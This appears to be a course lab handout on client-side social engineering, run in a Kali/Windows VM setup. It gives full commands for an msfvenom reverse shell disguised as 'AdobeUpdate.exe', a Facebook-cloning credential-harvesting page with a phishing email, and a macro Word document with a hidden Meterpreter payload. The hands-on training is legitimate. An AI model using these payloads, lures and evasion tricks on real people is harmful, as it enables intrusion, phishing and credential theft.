---

title: Lab &ndash; Social Engineering
number: 11
---

Today, social engineering attacks represent a major primary vector for hackers. As Bruce Schneier said, “Only amateurs attack machines; professionals target people.”[1](https://www.schneier.com/crypto-gram-0010.html)  Further, client-side software represents a much larger attack surface than server-side software. For these reason, many of the major breaches you read about in the news began with a client-side attack. 

In this lab you’ll use two leading tools to perform client-side attacks: msfvenom and the Social Engineering Toolkit (SET).

# Part 1. MSFVenom

In this section, you’ll use msfvenom to perform a client-side attack. Msfvenom can be used to turn Metasploit payloads into stand-alone executables that a user can be tricked into running. Your goal is to (1) create a malicious executable file, (2) host it on a web server, and (3) exploit a Windows 10 VM.

1.	Open your Kali Linux and Windows 10 VMs. Make sure that both are on the same subnet and can ping each other.
2.	On Windows, make sure Windows Defender is turned off. Run:
	* click the windows button on the bottom left of the desktop and searching for 'Defender' and choose 'Windows Defender Security Center'
	* click 'Virus & Threat protection settings'
	* move the 'Real-time protection' slider to the left.

4.	In Kali, type `msfvenom --help-formats` to see a list of output formats that msfvenom supports. We’ll use the `-f exe` option to create a Windows executable.
5.	In Kali, run the following command, all on one line:

        msfvenom -p windows/shell/reverse_tcp LHOST=[your Kali IP] LPORT=8080 -f exe > /tmp/AdobeUpdate.exe

    Where:

    * `-p`		Selects the payload
    * `-f`		Selects the file type of the output executable
    * `LHOST	`   The IP of your Kali Linux VM
    * `LPORT` 	The listening port on your Kali Linux VM

6.	Verify that the output file is about 73802 bytes in size. If not, you may need to check that you entered the command correctly and run it again.
7.	Now, set up a web server to host your malicious file. Change directories to /tmp by entering `cd /tmp`.
8.	Run this command:

        python -m SimpleHTTPServer 8888
        
9.	On your Windows 10 VM, browse to: 

        http://[IP of your Kali VM]:8888/

    Verify that you can view the contents of /tmp on your Kali VM.

10.	On Kali, open a new terminal window (besides the one that is running the Python webserver), and enter `msfconsole`.
11.	Enter `use exploit/multi/handler`. Once you’ve switched to this exploit module, type `show info`. Note that this module “is a stub that provides all of the features of the Metasploit payload system to exploits that have been launched outside of the framework.” A stub adds additional functionality to other exploits.
12.	Enter `set PAYLOAD windows/shell/reverse_tcp`.
13.	Enter `set LHOST [IP of Kali VM]`.
14.	Enter `set LPORT 8080`.

    **Note:** Set the port to `8080` (the port your malicious executable will use to connect back to your Kali VM), not `8888` (the port of your Python web server on Kali).
    
15.	Enter `exploit -j`. The `-j` option jobifies the exploit, or runs it as a job in the background. You can see a list of jobs running in the background by using the command jobs.
16.	On your Windows 10 VM, in a web browser (**not Chrome, it's too safe**), download the `AdobeUpdate.exe` file from the Python webserver and run the executable. 
    * If you use Edge/IE browser, download it, click "view downloads", right-click AdobeUpdate.exe, select "Run anyway"
    * If a warning appears saying that Windows couldn’t access Windows SmartScreen, "more info", then click “Run anyway.” 
    * For the warning, “Do you want to allow this app from an unknown publisher…,” click “Yes.”
17.	On your Kali VM, you should see in your msfconsole that “Command shell session X opened),” where X is the number of the new session. Type:

        sessions -i [the number of the new session]

    This should open a shell on the Windows VM.
    
18.	Type `whoami` to see the privileges that you are running under. Note that these are the privileges of the user of your Windows 10 VM.
19.	Run the command `netstat -n` to see a listing of open connections on the Windows server. Note the “ESTABLISHED” connection from the Windows VM to your Kali VM.
20.	Return to msfconsole by typing `control + z`. Enter `y` to background the session.
21.	To close the session, type `sessions -k 1`.

# Part 2. Social Engineering Toolkit (SET)

In this section, you’ll use the Social Engineering Toolkit (SET) to craft social engineering attacks. 

## Setup

Get the latest version of SET by entering the following commands in the Kali terminal (note: this lab was written for SET v. 6.0.5). To obtain the latest version of SET, use these commands:

    cd /opt/
    git clone https://github.com/trustedsec/social-engineer-toolkit/  set/
    
**Note:** There is a space before the word `set/`

Edit `/opt/set/src/core/config.baseline` and scroll to the bottom of the document.  Change `BLEEDING_EDGE=OFF` to `BLEEDING_EDGE=ON`

![](../images/lab_11_1.png){: .img-responsive width='50%'}

Save the file and exit.

1.	Return to the `/opt/set` directory and run the command `./setoolkit` (don’t forget the `./`). Agree to the terms of service. You should see a screen like the following:
    
    ![](../images/lab_11_2.png){: .img-responsive width='30%'}

2.	Enter option `1` for social-engineering attacks. That should display this menu:
    
    ![](../images/lab_11_3.png){: .img-responsive width='30%'}
    
3.	Select option `2` for website attack vectors. The next menu will list the various web attack vectors:

    ![](../images/lab_11_4.png){: .img-responsive width='30%'}
    
4.	Select number `3` for a credential harvesting attack. This brings you to the following screen:

    ![](../images/lab_11_5.png){: .img-responsive width='30%'}

5.	Select option 2 to clone a target website. This is a very sophisticated feature that can clone almost any website. After you’ve selected this feature, you’ll need to set an IP address to host the cloned site. Set “IP address for the POST back in Harvester/Tabnabbing” to the IP address of Kali Linux for the host-only network.

Now you get to choose the website to clone. Set the cloned website to `https://www.facebook.com`

If all has gone well, you should see a screen like the following:

![](../images/lab_11_6.png){: .img-responsive width='30%'}
    
6.	Now it’s time to script the phishing message to send. At this point, an attacker would use a tool or service to send a spoofed email. For simplicity, skip this step and instead send an email to your own email account with the message:

> “You are receiving this email because there is a problem with your account. Please go to www.facebook.com and login to verify your account."

Use rich text formatting to make `www.facebook.com` a hyperlink that points to `http://[IP of your Kali VM]`.

7. Open the email in your Windows 10 VM. When you receive the email, click the link, which should forward you to this page:

    ![](../images/lab_11_7.png){: .img-responsive width='50%'}
    
    **Note:** the address bar indicates the actual IP of the attacker. This is the biggest indication that the site is forged. If this were a more sophisticated attempt, the attacker would obtain a domain that looked similar to Facebook (like `facebook.webs.com`) For this, one could use a site like [http://freedns.afraid.org](http://freedns.afraid.org).
    
8.	Enter fake credentials into the fields on the spoofed website. After you’ve filled the fields in with whatever words you wish, press the login button on the website. On your Kali VM, you should see something similar to this in your terminal window:

    ![](../images/lab_set_facebook.png){: .img-responsive width='50%'}
        
# Part 3. SET Discovery

Complete two other attacks of your choosing using SET, and briefly describe your results.

**SET attack 1:**

**SET attack 2:**

# Part 4. Create a Malicious Microsoft Word Document

In this section, you’ll create a macro enabled Microsoft Word file that opens a Meterpreter session on an attacker’s machine. Note that this is a feature of Word, and not a security vulnerability. For this reason, this attack vector will work as long as you can convince a user to open the Word file.

1.	In Kali, run the following command (all one line):

        msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=172.16.1.61 LPORT=8080 -e x86/shikata_ga_nai -f vba-exe

2.	Read the beginning of the output. It explains that the output is divided into two sections: A "Macro" section and a "Payload" section. Copy _all_ of the output from your terminal from this command, and paste it into a text file on your Windows VM (or onto a machine with Microsoft Word).

3.	In Kali, run msfconsole and run the following commands:

        use exploit/multi/handler
        set payload windows/meterpreter/reverse_tcp
        set LPORT 8080
        set LHOST [IP of your Kali VM]
        exploit -j

    The above commands will cause Metasploit to listen on port 8080 for an incoming Meterpreter connection.

4.	Open Word and open the Visual Basic editor. To do this, from the File tab, select Options. Select “Customize Ribbon” from the left-hand side menu, and check the Developer checkbox (see screenshot below).

    ![](../images/lab_11_8.png){: .img-responsive width='70%'}

    From the Developer ribbon, select “Visual Basic” to open the Visual Basic editor.
    
    ![](../images/lab_11_9.png){: .img-responsive width='70%'}
    
    Inside the visual basic editor, right-click the document, select `Insert > Module`. Open the text file with the exploit code that you copied over from Kali. Paste in all of the code in the "Macro" section (**but not the payload**) into the Visual Basic module you just inserted. Save it as a Word macro-enabled document and close the VB editor.
    
    ![](../images/lab_11_10.png){: .img-responsive width='70%'}
    
5. In the main body of the Word document, paste the payload hex code from the kali output. Above the hex code, type a simple memo as the ostensible content of the memo. Next, highlight the hex code you pasted in and change the font size to “1” and the font color to white. This will make the hex code difficult to find for anyone who opens the document. Finally, save the document as a macro-enabled Word file (with a “.docm” extension). Name the file something like “Sales Memo.”

    **Optional:** “In order to keep user suspicion low, try embedding the code in one of the many Word macro games that are available on the Internet. That way, the user is happily playing the game while you are working in the background. This gives you some extra time to migrate to another process if you are using Meterpreter as a payload.” From _Metasploit: The Pentester’s Guide_.
    
6. Test that your malicious Word file by opening it on the Windows 10 VM. If Word asks, enable macro content. In the Kali VM, you should now see that a Meterpreter session has been opened to the host workstation.  If it doesn’t work, make sure that macros are enabled in your Word doc (Developer tab > Macro Security > Enable all macros).
    
    **Optional:** Use the sendEmail command on Kali to send a spoofed email with the malicious Word file as an attachment. To see how the sendEmail command works, type `man sendEmail.`
    
